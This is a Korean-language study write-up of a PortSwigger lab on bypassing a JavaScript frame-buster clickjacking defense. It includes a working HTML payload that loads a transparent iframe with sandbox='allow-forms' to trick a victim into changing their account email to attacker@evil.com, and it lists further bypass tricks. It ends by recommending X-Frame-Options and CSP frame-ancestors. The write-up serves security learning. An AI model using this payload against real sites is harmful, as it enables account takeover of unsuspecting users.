# Lab: Clickjacking with a frame buster script

## 개요

- **난이도**: Apprentice
- **주제**: Clickjacking — Frame Buster 우회 / iframe sandbox 속성 / allow-forms
- **링크**: https://portswigger.net/web-security/clickjacking/lab-frame-buster-script

## 목표

JavaScript 기반 Frame Buster 스크립트로 클릭재킹을 방어하는 사이트에서, `sandbox="allow-forms"` 속성을 이용해 JS 실행을 차단하면서도 폼 제출은 허용하는 방법으로 우회하여 이메일을 변경한다.

## Frame Buster 란

```javascript
// 전형적인 Frame Buster 구현
if (top !== self) {
    top.location = self.location;
}
// 또는
if (top.location !== self.location) {
    top.location.replace(self.location);
}
```

```
동작 원리:
  top  : 브라우저의 최상위 윈도우 (실제 주소창)
  self : 현재 윈도우 (iframe 안이면 iframe 자체)

iframe 안에서 실행 시:
  top !== self → True
  → top.location = self.location
  → 최상위 윈도우를 iframe URL 로 강제 이동
  → 피해자 주소창이 타겟 사이트 주소로 바뀜
  → 클릭재킹 노출 → 공격 실패
```

```
Frame Buster 가 없는 경우:
  피해자 화면: evil.com/exploit (주소창)
  실제 로드:   evil.com + 투명 iframe(target.com)
  → 피해자는 자신이 evil.com 에 있다고 생각

Frame Buster 가 있는 경우:
  iframe 로드 → JS 실행 → top.location = target.com
  → 주소창이 target.com 으로 바뀜
  → 피해자가 target.com 으로 이동했음을 인지 → 공격 실패
```

## sandbox 속성으로 Frame Buster 무력화

### iframe sandbox 속성

```
<iframe sandbox="..."> 는 iframe 내 기능을 제한함

기본값 (sandbox만 설정, 값 없음):
  모든 기능 비활성화
  - JS 실행 금지
  - 폼 제출 금지
  - 팝업 금지
  - same-origin 취급 금지

sandbox="allow-forms":
  폼 제출만 허용
  JS 실행은 여전히 금지 ← Frame Buster 실행 안 됨!

sandbox="allow-scripts":
  JS 실행만 허용
  (allow-scripts 없으면 JS 금지)

sandbox="allow-forms allow-scripts":
  폼 제출 + JS 모두 허용
  → Frame Buster 도 실행됨 → 우회 불가
```

### 우회 원리

```
[공격자 전략]
  sandbox="allow-forms" 만 설정
  → JS 실행 금지 → Frame Buster 실행 안 됨 → iframe 유지!
  → 폼 제출 허용 → 피해자 클릭 → 이메일 변경 폼 제출!

[핵심]
  Frame Buster 는 JS 로 구현됨
  sandbox → JS 차단 → Frame Buster 무력화
  but 폼 전송은 JS 없이도 가능 (HTML 네이티브 동작)
  → allow-forms 로 폼 전송만 살리면 됨
```

## 공격 방법

### 페이로드

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;          /* 위치 조정 중 */
        /* opacity: 0.0001;    최종 공격 */
        z-index: 2;
    }
    #decoy {
        position: absolute;
        top: 450px;
        left: 60px;
        z-index: 1;
    }
</style>

<div id="decoy">Click me!</div>

<!-- sandbox="allow-forms": JS 차단(Frame Buster 무력화) + 폼 제출 허용 -->
<iframe sandbox="allow-forms"
        src="https://VULNERABLE.com/my-account?email=attacker@evil.com">
</iframe>
```

### 실행 흐름

```
1. 피해자: exploit 페이지 방문

2. iframe 로드:
   sandbox="allow-forms" → JS 실행 차단
   → Frame Buster if (top !== self) 실행 안 됨
   → iframe 이 정상 로드된 채 유지
   → 이메일 필드에 attacker@evil.com 사전 입력됨

3. 피해자: "Click me!" (decoy) 클릭
   → iframe 안의 "Update email" 버튼 클릭

4. 폼 제출:
   allow-forms 허용 → 폼 전송 가능
   POST /my-account/change-email
   email=attacker@evil.com

5. 이메일 변경 완료
```

## 이전 랩들과의 비교

| 항목 | 001 랩 | 002 랩 | 003 랩 (이번) |
|------|--------|--------|--------------|
| 목표 | Delete 버튼 | Update email | Update email |
| 추가 방어 | CSRF 토큰 | 없음 | Frame Buster JS |
| 우회 방법 | iframe 정상 로드 | URL 파라미터 사전 입력 | sandbox="allow-forms" |
| 핵심 포인트 | CSRF 토큰은 클릭재킹 무방어 | URL로 값 사전 설정 | JS 차단으로 Frame Buster 무력화 |

## 핵심 정리

- Frame Buster 는 JS로 `top.location` 을 변경해 iframe을 탈출시키는 방어 기법이다.
- `sandbox="allow-forms"` 는 JS 실행을 차단하므로 Frame Buster가 실행되지 않는다.
- 폼 제출은 JS 없이도 HTML 네이티브 동작으로 가능하므로 `allow-forms` 만으로 충분히 공격이 성립한다.
- **Frame Buster 의 근본적 한계**: JS 기반 방어는 JS를 차단하면 무력화된다.
- **올바른 방어**: `X-Frame-Options` 또는 `CSP: frame-ancestors` — 서버 헤더 기반으로 브라우저가 iframe 로드 자체를 거부 (JS 와 무관)

## 배운 점 및 추가 학습

### 1. Frame Buster 의 한계 — JS 기반 방어의 약점

```
Frame Buster 우회 방법들:

[1] sandbox 속성 (이번 랩)
    <iframe sandbox="allow-forms">
    → JS 차단 → Frame Buster 실행 안 됨

[2] onbeforeunload 이벤트 재정의 (구형)
    부모 페이지에서 onbeforeunload 로 top.location 변경 막기

[3] 이중 iframe
    <iframe src="중간_iframe"> → <iframe src="타겟"> 형태로
    Frame Buster 가 상위 iframe 만 탈출하고 최상위는 못 탈출

[4] 브라우저 설정
    JS 비활성화 시 Frame Buster 무력화

→ 결론: JS 기반 방어는 신뢰할 수 없음
         서버 사이드 헤더로 방어해야 함
```

### 2. sandbox 속성 값 목록

```
allow-forms         : 폼 제출 허용
allow-scripts       : JS 실행 허용
allow-same-origin   : same-origin 정책 유지 (없으면 opaque origin 으로 격리)
allow-top-navigation: top.location 변경 허용 (Frame Buster 가 이걸 사용)
allow-popups        : 팝업 허용 (window.open 등)
allow-modals        : alert, confirm 등 허용
allow-pointer-lock  : 마우스 포인터 잠금 허용

공격자 관점:
  sandbox="allow-forms"          → JS 차단 + 폼 제출 허용 (이번 랩)
  sandbox="allow-scripts"        → JS 허용 but Frame Buster 도 실행됨
  sandbox="allow-forms allow-scripts" → 둘 다 허용 but Frame Buster 실행 → 실패

  allow-top-navigation 없으면:
    → Frame Buster 의 top.location = ... 도 차단됨!
    → 사실 sandbox 만으로도 Frame Buster 무력화 가능
    → allow-forms 는 폼 제출을 살리기 위해 추가
```

### 3. 서버 헤더 기반 방어 vs JS 기반 방어 비교

```
[JS 기반 Frame Buster]
  장점: 별도 서버 설정 없이 클라이언트에서 동작
  단점: sandbox, JS 비활성화, 중간 iframe 등으로 우회 가능
       공격자가 iframe 환경을 제어하므로 신뢰 불가

[서버 헤더 기반 방어]
  X-Frame-Options: DENY
  Content-Security-Policy: frame-ancestors 'none'

  장점: 브라우저가 응답 헤더를 읽고 iframe 로드 자체를 거부
       sandbox, JS 등 iframe 내부 설정과 무관
       공격자가 우회 불가 (브라우저 레벨 강제)
  단점: 서버 설정 필요

→ Frame Buster 는 "없는 것보다 낫지만" 신뢰할 수 없는 방어
   X-Frame-Options / CSP frame-ancestors 와 병행 또는 대체 필요
```

### 4. sandbox 와 CSRF 토큰의 관계

```
sandbox="allow-forms" 상태에서:
  - JS 실행 금지 → CSRF 토큰을 JS 로 동적 삽입하는 경우 실패
  - 하지만 서버가 HTML 에 CSRF 토큰을 직접 렌더링하면:
    <input type="hidden" name="csrf" value="TOKEN">
    → JS 없이도 폼 제출 시 토큰 포함됨 → 서버 검증 통과
    → 클릭재킹 + sandbox 우회 여전히 유효

→ CSRF 토큰은 클릭재킹을 막지 못함 (001 랩에서 확인한 것과 동일)
```
